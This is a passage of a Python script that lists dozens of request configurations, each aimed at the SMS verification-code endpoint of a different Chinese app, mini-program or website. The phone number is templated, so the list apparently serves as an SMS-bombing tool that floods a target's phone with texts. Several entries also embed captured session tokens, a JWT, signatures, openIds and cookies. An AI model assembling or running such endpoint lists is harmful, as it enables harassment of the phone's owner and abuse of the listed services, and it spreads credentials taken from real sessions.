        "Accept-Encoding": "gzip,compress,br,deflate", "tocker": "",
        "Referer": "https://servicewechat.com/wx2748049892e9eb92/23/page-frame.html"
    },
    "data": '{"tel":"13800000000","pass":"","code":""}'
})

# 接口26
api_configs.append({
    "method": "POST",
    "url": "https://weishop02.huanong1688.com/shop/s/guest/sendRegAuthCode",
    "headers": {
        "Host": "weishop02.huanong1688.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "sec-ch-ua-mobile": "?1", "X-Requested-With": "XMLHttpRequest", "User-Agent": "__UA__",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8", "token": "",
        "Origin": "https://weishop02.huanong1688.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://weishop02.huanong1688.com/uk1635580563500826624/register/index",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    },
    "data": "mobile=13800000000&businessType=1000&tenantId=uk1635580563500826624&lang=zh_CN",
    "cookies": {"HNST_SHOP_USER_INFO_uk1635580563500826624": ""}
})

# 接口27
api_configs.append({
    "method": "GET",
    "url": "https://admin.wumazhnmg.com/zmd-service-base/other/getSmsCode?mobile=13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口28
api_configs.append({
    "method": "POST",
    "url": "https://sh.leakeyun.com/weapp/base/sendvalidate",
    "headers": {
        "Host": "sh.leakeyun.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json", "company": "sxthf_TH2024",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx31a84ba4f865c5ca/5/page-frame.html"
    },
    "data": '{"phone":"13800000000"}'
})

# 接口30
api_configs.append({
    "method": "POST",
    "url": "https://member-purchase.hbxinfadi.com/api/open/member/sms",
    "headers": {
        "Host": "member-purchase.hbxinfadi.com", "Connection": "keep-alive", "authorization": "111",
        "charset": "utf-8", "User-Agent": "__UA__", "content-type": "application/json; charset=UTF-8",
        "Accept-Encoding": "gzip,compress,br,deflate", "app-version": "2.2.4",
        "Referer": "https://servicewechat.com/wx5e1817bd2ac2f220/204/page-frame.html"
    },
    "data": '{"mobile":"13800000000","tdc_id":81,"PhoneDeviceInfo":{"brand":"apple","deviceBrand":"apple","deviceId":"17656331022864097366","deviceModel":"V2404A","deviceOrientation":"portrait","devicePixelRatio":3.5,"model":"V2404A","system":"Android 14","networkType":"wifi","isConnected":true}}'
})

# 接口32
api_configs.append({
    "method": "POST",
    "url": "https://v8mp.600vip.cn/api/GeneralInterface/SendValidationCode",
    "headers": {
        "Host": "v8mp.600vip.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "mp_api_shopid": "", "content-type": "application/json",
        "mp_api_compcode": "18679393949", "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx165676254d5f5c01/1/page-frame.html"
    },
    "data": '{"Mobile":"13800000000"}'
})

# 接口34
api_configs.append({
    "method": "GET",
    "url": "https://uc.17win.com/sms/v4/web/verificationCode/send?mobile=13800000000&scene=bind&isVoice=N&appId=70774617641171202208031508899",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口35
api_configs.append({
    "method": "POST",
    "url": "https://mcpwxp.motherchildren.com/cloud/ppclient/msg/getauthcode",
    "headers": {
        "Host": "mcpwxp.motherchildren.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx38285c6799dac2d1/284/page-frame.html"
    },
    "data": '{"organCode":"HXD2","appCode":"HXFYAPP","channelCode":"PATIENT_WECHAT_APPLET","phoneNum":"13800000000","busiCode":"hyt_account","tempCode":"normal","clientId":"ooo9znbykh","needCheck":false}'
})

# 接口38
api_configs.append({
    "method": "GET",
    "url": "https://xcx.padtf.com/xcxapi/appuser.php?rec=getsjyzm&phone=13800000000&msgtype=4&session_key=33839c2290cc900dab00e8b39cbda6bd",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口39
api_configs.append({
    "method": "PUT",
    "url": "https://www.yida178.cn/prod-api/sendRegisterCode/13800000000",
    "headers": {
        "Host": "www.yida178.cn", "Connection": "keep-alive", "authorization": "Bearer undefined",
        "charset": "utf-8", "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "content-language": "zh_CN",
        "Referer": "https://servicewechat.com/wxba8e24dcc66715a4/56/page-frame.html"
    }
})

# 接口41
api_configs.append({
    "method": "POST",
    "url": "https://www.dxylbzj.com/api/app/sms/code",
    "headers": {
        "Host": "www.dxylbzj.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json;charset=utf-8",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxa1d158d450bd2f57/9/page-frame.html"
    },
    "data": '{"phone":"13800000000"}'
})

# 接口42
api_configs.append({
    "method": "POST",
    "url": "https://cx-hmb.zkydib.com/hmb-js26/api/v1/user/register/sms",
    "headers": {
        "Host": "cx-hmb.zkydib.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "X-PI-PRO-NUM": "CITY00000022", "sec-ch-ua-mobile": "?1", "User-Agent": "__UA__",
        "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
        "projectId": "PJ000059", "Origin": "https://cx-hmb.zkydib.com",
        "X-Requested-With": "com.tencent.mobileqq", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://cx-hmb.zkydib.com/js26/?t=1765684968808",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    },
    "data": '{"phoneNo":"13800000000"}',
    "cookies": {"_hmb_cx_sid_js26": "\"js26:wx882ece121b851496:ozRDP6ZsYbD7YPBZAWo19VNkVXmQ\""}
})

# 接口43
api_configs.append({
    "method": "POST",
    "url": "https://api.hamptonhotels.com.cn/api/User/SendMobileCode",
    "headers": {
        "Host": "api.hamptonhotels.com.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "x-auth-header": "a0eemh+SwGEvHHT77TqR0ty9yqUPqYQjeY0wg4TJgOkFjF1ni3mjHxX2Z3dnKlKX9wJ3XViyZlpG423AnsOi/agDcnMElZbdIXqmKVemSQc7119hAzk1pmIoxuyyctlOugOAGN8Ii9ReUGPYTxQh8lTE7aBv2XV5q/ar/E0uFjetT1Y8IMbRWmw/WCp7x/Ad|1|__TIMESTAMP__",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxb9a76c5f2625cfc9/231/page-frame.html"
    },
    "data": '{"reqid":35,"mobile":"15915637092","no_valid_code":true}'
})

# 接口44
api_configs.append({
    "method": "GET",
    "url": "https://w.argylehotels.com/hsgroup/api/sms-vcode?phoneNo=13800000000&orgId=001",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口45
api_configs.append({
    "method": "POST",
    "url": "https://public.hikparking.com/api/driver/v2/api/sendVerifyCode",
    "headers": {
        "Host": "public.hikparking.com", "Connection": "keep-alive", "authorization": "",
        "clienttype": "8", "charset": "utf-8", "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx1db9f853c02f4bd7/60/page-frame.html"
    },
    "data": '{"phone":"15915637092","type":1,"random":67,"sign":"21bf8482004d5291ff0c5d04f49561c5"}'
})

# 接口46
api_configs.append({
    "method": "GET",
    "url": "https://xtzhtc.cn/acct_security/code/sms?mobile=13800000000",
    "headers": {
        "Host": "xtzhtc.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "deviceid": "1765704685811908070",
        "Referer": "https://servicewechat.com/wx7f4189124b248255/50/page-frame.html"
    }
})

# 接口50
api_configs.append({
    "method": "POST",
    "url": "https://dlmixc-parking.lncrland.cn/syhgwxh-api/1.0/default/send-msg",
    "headers": {
        "Host": "dlmixc-parking.lncrland.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx61c81e0c74e1c278/13/page-frame.html"
    },
    "data": '{"phone":"15915637092","tempType":"ZL","channel":"MINI","length":4}'
})

# 接口51
api_configs.append({
    "method": "GET",
    "url": "https://tsms1.sctfia.com/captcha_send?phone=13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口52
api_configs.append({
    "method": "POST",
    "url": "https://php.51jjcx.com/user/Login/sendSMStttt_123",
    "headers": {
        "Host": "php.51jjcx.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate", "accept": "application/json, text/plain, */*",
        "Referer": "https://servicewechat.com/wxfaa1ea1ef2c2be3f/231/page-frame.html"
    },
    "data": "phone=15915637092&sign=vepMXAyON4Y2iUmCU8kBK00Wp4jnyWK6WSVlCR86oDLEOYyIM0Z%2FqSwWpTG1hxGB7LVvA8OLZqG9FFOaku2X33spidhBYWG%2B8iwX9%2BottphviMiG2JL%2By6zta3bxGrgYOGu8Nmii6VfiVyoU1clid3F7CLodljKhuuY1IVEbOFxSZ16C%2Fcag%2FOy4UUUlzXvsSwFv4K5%2FFLX5QV3GKhtxqF6aEcUqLJquJPDUNq%2GOZZuaRnb%2B%2Bz9wtJvTk%2BHKnDbIUmNuolvqFTOM%2BV7WS0AvUsSCVgKhHoQsUf7Lz2j0kr1PC1X78mPEn82nz8%2BAl6%2FAFSNHDeoknBTzpnNgmrm5OQ%3D%3D"
})

# 接口53
api_configs.append({
    "method": "POST",
    "url": "https://skyclient.shangshuikeji.cn/h5/v1/passenger/user/wx/sendVerifyCode",
    "headers": {
        "Host": "skyclient.shangshuikeji.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json;charset=UTF-8",
        "Accept-Encoding": "gzip,compress,br,deflate", "_yy_cid": "100001",
        "Referer": "https://servicewechat.com/wx0f7efcce0dffa575/300/page-frame.html"
    },
    "data": '{"channelId":"100001","sdk":"3.8.12","deviceModel":"V2403A","appversion":"release/feat_20251204","pf":2,"channel":"wechat_applet","openId":"o-Fd45UsgFym5ruBA3kcGn_-Hd6c","commonParams":"{\\\"sdk\\\":\\\"3.8.12\\\",\\\"deviceModel\\\":\\\"V2403A\\\",\\\"appversion\\\":\\\"release/feat_20251204\\\",\\\"pf\\\":2,\\\"channel\\\":\\\"wechat_applet\\\",\\\"openId\\\":\\\"o-Fd45UsgFym5ruBA3kcGn_-Hd6c\\\"}","mobile":"15915637092"}'
})

# 接口56
api_configs.append({
    "method": "GET",
    "url": "https://mini.shangyubike.com/USER-SERVICE/sms/sendValidCode?mobileNo=13800000000&reqType=Regist",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口57
api_configs.append({
    "method": "POST",
    "url": "https://appdl.zzcyjt.com:60044/api/person/getLoginCode",
    "headers": {
        "Host": "appdl.zzcyjt.com:60044", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxba28c1653b77e510/215/page-frame.html"
    },
    "data": '{"phoneNumber":"15915637093"}'
})

# 接口58
api_configs.append({
    "method": "POST",
    "url": "https://load.dingdatech.com/api/uum/security/getVcode",
    "headers": {
        "Host": "load.dingdatech.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxf7c61a26a092859c/60/page-frame.html"
    },
    "data": '{"appId":"mtacf84f3423b0e6132","phoneNO":"15915637093"}'
})

# 接口59
api_configs.append({
    "method": "POST",
    "url": "https://www.xtjfcd.com/api/api-service/api/getCode",
    "headers": {
        "Host": "www.xtjfcd.com", "Connection": "keep-alive", "authorization": "", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx9fb2b19202fa5717/38/page-frame.html"
    },
    "data": '{"phoneNo":"13800000000","sellerNo":"xt","type":"3"}'
})

# 接口60
api_configs.append({
    "method": "GET",
    "url": "https://erp.fjtantu.cn/api/sys/getSmsCode?phone=13800000000",
    "headers": {
        "Host": "erp.fjtantu.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json;charset=utf-8",
        "source": "7", "Accept-Encoding": "gzip,compress,br,deflate", "cache-control": "no-cache",
        "accept-charset": "utf-8", "x-access-token": "",
        "Referer": "https://servicewechat.com/wx120464bb36389b2b/25/page-frame.html"
    }
})

# 接口61
api_configs.append({
    "method": "POST",
    "url": "https://api.yccsparking.com/yccstc-service-api/account/getPin",
    "headers": {
        "Host": "api.yccsparking.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "accept": "application/json",
        "Referer": "https://servicewechat.com/wx8c0f477b635e9b93/87/page-frame.html"
    },
    "data": '{"mobilenum":"15915637098","pinlength":6,"verify_key":"","verify_code":"","from":"3","utoken":""}'
})

# 接口63
api_configs.append({
    "method": "POST",
    "url": "https://www.kyxtpt.com/auth/api/v1/login/sms-valid-code-send",
    "headers": {
        "Host": "www.kyxtpt.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "6zubypya": "[object Undefined]",
        "devicetype": "WECHAT", "accept": "application/json",
        "Referer": "https://servicewechat.com/wx73fb48c3856b005d/39/page-frame.html"
    },
    "data": '{"loginId":"15915637092"}'
})

# 接口64
api_configs.append({
    "method": "POST",
    "url": "https://xxdz.maiziedu.cn/api/v2/sms/sendRegCode",
    "headers": {
        "Host": "xxdz.maiziedu.cn", "Connection": "keep-alive", "authorization": "Bearer",
        "charset": "utf-8", "x-app-platform": "mp-weixin", "User-Agent": "__UA__",
        "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate",
        "x-app-version": "2.0.16",
        "Referer": "https://servicewechat.com/wx7c2d51b59c4fc80c/164/page-frame.html"
    },
    "data": '{"mobile":"15915637092"}'
})

# 接口65
api_configs.append({
    "method": "POST",
    "url": "https://tjcx-server.crcctjyy.cn/his/smsVerification/sendVerification",
    "headers": {
        "Host": "tjcx-server.crcctjyy.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx7631fd8e4006598c/2/page-frame.html"
    },
    "data": '{"phoneNumber":"15915637092"}'
})

# 接口66
api_configs.append({
    "method": "POST",
    "url": "https://qcty.crscl.com.cn/crscl-wlgl-app-api/crscl-wlgl-user/cust/custSendAuthCodeRegister",
    "headers": {
        "Host": "qcty.crscl.com.cn", "Connection": "keep-alive", "authorization": "",
        "charset": "utf-8", "appsign": "1e6dcc704d2479fb758c8c1fda241a91", "User-Agent": "__UA__",
        "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate",
        "timestamp": "__TIMESTAMP__",
        "Referer": "https://servicewechat.com/wx2a68df8c778b639b/61/page-frame.html"
    },
    "data": '{"mobileNumber":"15915637098"}'
})

# 接口68
api_configs.append({
    "method": "POST",
    "url": "https://www.ylt56.com/validate_code.do",
    "headers": {
        "Host": "www.ylt56.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate", "accept": "application/json",
        "Referer": "https://servicewechat.com/wx8a7568b39073e374/86/page-frame.html"
    },
    "data": "phone_num=13800000000"
})

# 接口72
api_configs.append({
    "method": "GET",
    "url": "https://rihapi.rwjiankang.com/mobile/getRegisterCode?mobile=13800000000&thirdEnv=1&userFrom=1",
    "headers": {
        "Host": "rihapi.rwjiankang.com", "Connection": "keep-alive", "charset": "utf-8",
        "thirdenv": "1", "User-Agent": "__UA__", "content-type": "application/json",
        "access-token": "e5a7a15927934fc4b74dbda078b1e490", "Accept-Encoding": "gzip,compress,br,deflate",
        "inlet": "ypqjswszx", "Referer": "https://servicewechat.com/wxefea52822f229877/2/page-frame.html"
    }
})

# 接口73
api_configs.append({
    "method": "GET",
    "url": "https://dingdangyjh.com/mallapi/phone/code?type=1&phone=13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口74
api_configs.append({
    "method": "POST",
    "url": "https://live-server.yinghecloud.com/api/v1/common/sendPhoneCode",
    "headers": {
        "Host": "live-server.yinghecloud.com", "Connection": "keep-alive", "traceid": "qs41d9522062046b3cfd49e190ee61",
        "charset": "utf-8", "role": "10", "latitude": "", "User-Agent": "__UA__", "platformid": "yjt",
        "Accept-Encoding": "gzip,compress,br,deflate", "version": "1.2.01", "platform": "wx-mini",
        "network": "wifi", "share_id": "1", "authorization": "Bearer", "system": "Android 15",
        "model": "V2403A", "content-type": "application/json", "osversion": "15", "loginappid": "10020",
        "brand": "vivo", "osname": "android", "longitude": "",
        "Referer": "https://servicewechat.com/wx87852a2ac8a9a856/40/page-frame.html"
    },
    "data": '{"phone":"13800000000","role":10,"type":7,"reset":true}'
})

# 接口75
api_configs.append({
    "method": "POST",
    "url": "https://svip.bgjtsvip.com/api/send_code",
    "headers": {
        "Host": "svip.bgjtsvip.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "merchant-id": "57", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "store-id": "479", "token": "",
        "Referer": "https://servicewechat.com/wx7966dac6db63ed45/60/page-frame.html"
    },
    "data": '{"mobile":"13800000000","scene":2}'
})

# 接口77
api_configs.append({
    "method": "GET",
    "url": "https://app.yae111.com/base/getLoginSms?phone=13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口78
api_configs.append({
    "method": "GET",
    "url": "https://api-salus.yaoud.cn/infra/register/getAuthCode/13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口80
api_configs.append({
    "method": "POST",
    "url": "https://srv-uzone.bcpmdata.com/message/send",
    "headers": {
        "Host": "srv-uzone.bcpmdata.com", "Connection": "keep-alive", "bcpm-platform": "miniprogram",
        "charset": "utf-8", "app-id": "LkdJdgSm", "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "platform": "mp-weixin",
        "Referer": "https://servicewechat.com/wx9b8ad01a7a6f82af/119/page-frame.html"
    },
    "data": '{"area_code":"86","phone":"13800000012"}'
})

# 接口82
api_configs.append({
    "method": "GET",
    "url": "https://gcxy8.com/cnexam/miniApi/appUser/officialAccounts/member/registerSendToMobile?phonenumber=13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口83
api_configs.append({
    "method": "POST",
    "url": "https://api.medlive.cn/v2/user/register/user_open_mobile_code_applet.php",
    "headers": {
        "Host": "api.medlive.cn", "Connection": "keep-alive", "authorization": "", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxee6b2a17a0ad2720/4/page-frame.html"
    },
    "data": "mobile=13800000000&resource=applet&app_name=drug_applet&timestamp=__TIMESTAMP__",
    "cookies": {"ymtinfo": "eyJ1aWQiOiIiLCJyZXNvdXJjZSI6Im1pbmlwcm9ncmFtIiwiYXBwX25hbWUyIjoiZHJ1Z19taW5pcHJvZ3JhbSIsImV4dF92ZXJzaW9uIjoiMiIsInVuaW9uaWQiOiIifQ=="}
})

# 接口84
api_configs.append({
    "method": "POST",
    "url": "https://ycx.cqmetro.cn/bas/mc/v1/send-sms-code",
    "headers": {
        "Host": "ycx.cqmetro.cn", "Content-Type": "application/json",
        "signature": "Jsz+LXqnwqX2bghxG7QmumvxMMYXtIu1E3/dgYE7qgLDdgggleV711ATvebklUEWzvppqpKTFxvK4v9uAKwaZQj+xNF4e8LCftuAh2iouphUyJqIz39JMRNS7PxvzfntiC9rh8POX84LLwvYjOzISEB2+eE1+N2+DBENnA3Pfys=",
        "Referer": "https://servicewechat.com/wxa17aea49c17829df/8/page-frame.html"
    },
    "data": {"mobile_phone": "13800000000", "sms_type": "0"}
})

# 接口85
api_configs.append({
    "method": "POST",
    "url": "https://168api-tyxcx.zaiguahao.com/api/common/smsSend",
    "headers": {
        "Host": "168api-tyxcx.zaiguahao.com", "Content-Type": "application/json",
        "openid": "oV6zA6w65irzV1-yy9fI-q2XoQfs"
    },
    "data": {"applets_id": 1352, "phone": "13800000000"}
})

# 接口87
api_configs.append({
    "method": "POST",
    "url": "https://xcx.kuaidizs.cn/xcx/identity/sendCapcha",
    "headers": {
        "Host": "xcx.kuaidizs.cn", "Content-Type": "application/json",
        "token": "2da74f341fa94690a8e7318ab8682605oV0yQ4o5tAp-Gkp9tMFJH8YWs1oE"
    },
    "data": {"phone": "13800000000"}
})

# 接口88
api_configs.append({
    "method": "POST",
    "url": "https://p.kuaidi100.com/xcx/sms/sendcode",
    "headers": {
        "Host": "p.kuaidi100.com", "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://servicewechat.com/wx1dd3d8b53b02d7cf/553/page-frame.html"
    },
    "data": "name=13800000000&validcode="
})

# 接口90
api_configs.append({
    "method": "POST",
    "url": "https://www.101s.com.cn/prod-api/memorial_hall/user/send",
    "headers": {
        "Host": "www.101s.com.cn", "Content-Type": "application/json",
        "Referer": "https://servicewechat.com/wxff5c9882b5e61d35/9/page-frame.html"
    },
    "data": {"phone": "13800000000"}
})

# 接口93
api_configs.append({
    "method": "GET",
    "url": "https://api.xinhualeyu.com/uums/account/sendSms?loginType=1&mobile=13800000000&operaType=1",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口96 (hosian)
api_configs.append({
    "method": "POST",
    "url": "https://game.hosian.com/api/sms",
    "headers": {
        "Host": "game.hosian.com", "Accept": "*/*", "Authorization": "", "clientId": "",
        "locale": "zh", "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json", "tenantId": "0", "lang": "zh_CN", "Connection": "keep-alive",
        "sign": "267670e6d840493d6a252e44bc86805bb3a8aab0740c436a5e600c557f197fdb",
        "User-Agent": "__UA__"
    },
    "data": {"phone": "13800000000"}
})

# 接口98
api_configs.append({
    "method": "POST",
    "url": "http://scm.qlx56.com/gateway/scm-basic/v1/msgRecord/sendAuthCode",
    "headers": {
        "Host": "scm.qlx56.com", "Content-Type": "application/json; charset=UTF-8",
        "User-Agent": "__UA__"
    },
    "data": {"mobile": "13800000000", "tenantCode": "60087", "openId": "oapZHs4qwfJJEXDIrFhnx62bPDiY"}
})

# 接口99
api_configs.append({
    "method": "POST",
    "url": "https://passport.xag.cn/home/sms_code",
    "headers": {
        "Host": "passport.xag.cn", "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "__UA__"
    },
    "data": "icc=86&phone=13800000000"
})

# 接口100
api_configs.append({
    "method": "POST",
    "url": "https://api.kucee.com/website.Access/getPhoneCode",
    "headers": {
        "Host": "api.kucee.com", "Content-Type": "application/json",
        "User-Agent": "__UA__"
    },
    "data": {"phone": "13800000000", "type": "1", "storeId": "0"}
})

# 接口102
api_configs.append({
    "method": "POST",
    "url": "https://sso.zlgx.com/api/v2/sms/sendVerificationCode",
    "headers": {
        "Host": "sso.zlgx.com", "Content-Type": "application/json; charset=utf-8",
        "User-Agent": "__UA__"
    },
    "data": {"params": {"phone": "13800000000", "platfromCode": "fpop"}}
})

# ========== 新增的44个接口 ==========
new_api_list = [
    {
        "method": "POST",
        "url": "https://api.pencilnews.cn/sms/send",
        "headers": {
            "Host": "api.pencilnews.cn", "Content-Type": "application/json", "Connection": "keep-alive",
            "sa-super-property": "{\"manufacturer\":\"APPLE\",\"model\":\"iPhone12,1\",\"wifi\":true,\"screen_height\":\"812.000000\",\"screen_width\":\"375.000000\",\"network_type\":\"\"}",
            "Accept": "*/*", "version": "2.9.9",
            "User-Agent": "PencilNews/2.9.9 (iPhone; iOS 18.7; Scale/2.00)",
            "Accept-Language": "zh-Hans-CN;q=1", "Accept-Encoding": "gzip, deflate, br"
        },
        "data": {"phone": "13800138000", "sms_type": "reg"}
    },
    {
        "method": "POST",
        "url": "https://as.hypergryph.com/general/v1/send_phone_code",
        "headers": {
            "Host": "as.hypergryph.com", "Accept": "*/*", "Sec-Fetch-Site": "same-site",
            "Accept-Language": "zh-CN,zh-Hans;q=0.9", "Accept-Encoding": "gzip, deflate, br",
            "Sec-Fetch-Mode": "cors", "Content-Type": "application/json;charset=utf-8",
            "Origin": "https://www.hypergryph.com",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://www.hypergryph.com/", "Connection": "keep-alive", "Sec-Fetch-Dest": "empty",
            "Cookie": "_ga=GA1.1.595367902.1770209761; _ga_V0ZVS049N5=GS2.1.s1770209760$o1$g1$t1770211278$j60$l0$h0; HMACCOUNT=49E6075557076A09; Hm_lpvt_24d8cd20e5a3728877d88996f22d3eaf=1770211278; Hm_lvt_24d8cd20e5a3728877d88996f22d3eaf=1770209760,1770211278"
        },
        "data": {"phone": "13800138000", "type": 2}
    },
    {
        "method": "GET",
        "url": "https://www.gfwj168.com/api/v1_1/UCenter/sendYzm?phone=13800138000",
        "headers": {
            "Host": "www.gfwj168.com", "Connection": "keep-alive", "token": "",
            "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wxc8910655f8204472/105/page-frame.html"
        }
    },
    {
        "method": "GET",
        "url": "https://h5-applets.77ircloud.com/tmini/authservice/sms-verifyCodes?checkPassPort=false&mobileOrEmail=13800138000&productScene=2&tenantId=3463567&type=6",
        "headers": {
            "Host": "h5-applets.77ircloud.com", "Connection": "keep-alive", "x-mini-org-id": "3463567",
            "ot": "3463567,9223090561878065152", "unCheckLoginMutex": "true", "content-type": "application/json",
            "Authorization": "eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyMDUxMDIzOTA4MDcwODE2Iiwic3ViIjoie1widWlkXCI6MjA1MTAyMzkwODA3MDgxNixcInVzZXJOYW1lXCI6XCJcIixcInVzZXJUeXBlXCI6MSxcInNcIjpudWxsLFwidGJcIjpudWxsLFwiZGJpZFwiOjM0NjM1Njd9IiwiZXhwIjoxNzcwODE2MzI2fQ.71A_cPBcK79uIezeZpzJMoW9ezX4_3lgyRhM4mcA8mg",
            "X-Open-Id": "o0l5a5BidFmFs5GehTKhqMGmLJSk", "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx00b50e862c9dd46c/53/page-frame.html"
        }
    },
    {
        "method": "POST",
        "url": "https://oms.gdqyqx.com/qyqx-oms-api/app/user/sendAuthCode",
        "headers": {
            "Host": "oms.gdqyqx.com", "Connection": "keep-alive", "accessToken": "",
            "content-type": "application/json", "terminal": "2", "Accept-Encoding": "gzip,compress,br,deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004430) NetType/WIFI Language/zh_CN",
            "Referer": "https://servicewechat.com/wx317cf609e6eef82d/228/page-frame.html"
        },
        "data": {"type": 1, "userName": "13800138000"}
    },
    {
        "method": "POST",
        "url": "https://mpapi.toybaba.com/Code/Send",
        "headers": {
            "Host": "mpapi.toybaba.com", "Connection": "keep-alive", "content-type": "application/json",
            "Accept-Encoding": "gzip,compress,br,deflate",
